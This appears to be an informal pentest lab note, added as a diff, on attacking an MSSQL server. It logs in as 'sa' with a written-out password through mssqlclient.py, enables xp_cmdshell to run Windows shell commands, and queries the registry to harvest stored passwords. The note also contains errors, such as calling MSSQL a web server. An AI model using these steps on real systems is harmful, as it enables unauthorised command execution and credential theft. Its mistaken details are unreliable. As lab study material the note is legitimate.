@@ -1,0 +1,37 @@
+windows lab
+
+if you facing situation about mssql so basically
+msql is a web server to execute command in windows shell
+so if you crack msql user and password than you are able to execute command im target windows shell
+
+so one script to login mssql server 
+
+for linux : mysql
+for windows : mssql
+
+mssql script is : mssqlclient.py ( available on github )
+
+For example testing
+
+mssql port is 1435 
+target username is sa
+target password is eject......
+target IP : 192.168.179.70
+
+python/2/3 mssqlclient.py -port 1435 'sa:EjectFrailtyThorn425@192.168.179.70
+
+
+SQL> enable_xp_cmdshell
+SQL> EXEC xp_cmdshell 'whoami'
+SQL> EXEC xp_cmdshell 'ipconfig'
+
+lets try to some enum passwords of windows machine
+
+SQL> EXEC xp_cmdshell 'reg query HKLM\SYSTEM /f password /t REG_SZ /s
+
+if you see password 
+than you login the target windows machine
+
+--------------
+HAPPY HACKING
+--------------
